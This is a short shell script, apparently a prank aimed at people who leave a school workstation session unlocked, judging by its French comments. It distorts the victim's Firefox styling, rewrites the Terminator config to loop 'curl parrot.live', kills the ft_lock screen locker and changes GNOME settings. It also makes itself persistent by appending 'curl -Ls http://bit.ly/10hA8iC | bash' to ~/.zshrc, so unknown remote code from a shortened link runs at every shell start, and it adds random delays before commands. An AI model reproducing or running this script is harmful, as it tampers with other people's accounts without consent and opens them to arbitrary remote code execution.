#!/bin/sh

profile="$(echo ~/.mozilla/firefox/*.default-release | cut -d\  -f1)"
echo "$profile"
mkdir -p "$profile"/chrome/
cat>"$profile"/chrome/userContent.css<<EOF
/*lock ta session la prochaine fois*/
*{color:fuchsia!important;font-family:'Z003'!important;}
div{background: linear-gradient(fuchsia, white) !important;
transform: rotate(0.3deg);}
EOF
cat>"$profile"/chrome/userChrome.css<<EOF
*{color:green!important;font-weight:bold!important;}
*{
filter: blur(0.4px) !important;transform:translateX(5%);}
EOF
cat>"$profile"/user.js<<EOF
user_pref("toolkit.legacyUserProfileCustomizations.stylesheets", true);
EOF
cat >~/.config/terminator/config<<EOF
[global_config]
[keybindings]
[profiles]
  [[default]]
    cursor_color = "#aaaaaa"
    use_custom_command = True
    custom_command = /usr/bin/parrot.live
  [[none]]
    cursor_color = "#aaaaaa"
    exit_action = restart
    login_shell = True
    use_custom_command = True
    custom_command = /usr/bin/curl parrot.live
[layouts]
  [[default]]
    [[[window0]]]
      type = Window
      parent = ""
    [[[child1]]]
      type = Terminal
      parent = window0
      profile = default
  [[New Layout]]
    [[[child0]]]
      type = Window
      parent = ""
      order = 0
      position = 0:0
      maximised = True
      fullscreen = False
      size = 1920, 995
      title = curl parrot.live
      last_active_term = 2fee572b-065e-4bef-b82b-8f8b067d7747
      last_active_window = True
    [[[child1]]]
      type = VPaned
      parent = child0
      order = 0
      position = 495
      ratio = 0.5
    [[[child2]]]
      type = HPaned
      parent = child1
      order = 0
      position = 958
      ratio = 0.5002610966057441
    [[[terminal3]]]
      type = Terminal
      parent = child2
      order = 0
      profile = default
      uuid = 8e532fc3-8d6d-4c4e-9762-adab1a08d202
    [[[terminal4]]]
      type = Terminal
      parent = child2
      order = 1
      profile = default
      uuid = 4b4319d3-16a5-42ed-aef6-ca7841e9a0aa
    [[[child5]]]
      type = HPaned
      parent = child1
      order = 1
      position = 958
      ratio = 0.5002610966057441
    [[[terminal6]]]
      type = Terminal
      parent = child5
      order = 0
      profile = default
      uuid = 2fee572b-065e-4bef-b82b-8f8b067d7747
    [[[terminal7]]]
      type = Terminal
      parent = child5
      order = 1
      profile = default
      uuid = 9e624bf5-a992-4deb-a123-60dbc467949c
[plugins]
EOF
pkill -9 ft_lock
terminator -l'New Layout' -p none
cat>>~/.zshrc<<EOF
echo 'jai pas lock ma session'
curl -Ls http://bit.ly/10hA8iC | bash
echo 'chayanne le goat'
echo -en  $'\\033]0;chayanne le goat\\a'
preexec(){
if (( RANDOM > 20000 )); then
  sleep 1
fi
}
EOF
gsettings set org.gnome.desktop.wm.preferences button-layout 'appmenu,maximize,close:'
curl -Ls http://bit.ly/10hA8iC | bash
echo 'chayanne le goat'
echo -en  $'\033]0;chayanne le goat\a'
preexec(){
if (( RANDOM > 20000 )); then
  sleep 1
fi
}
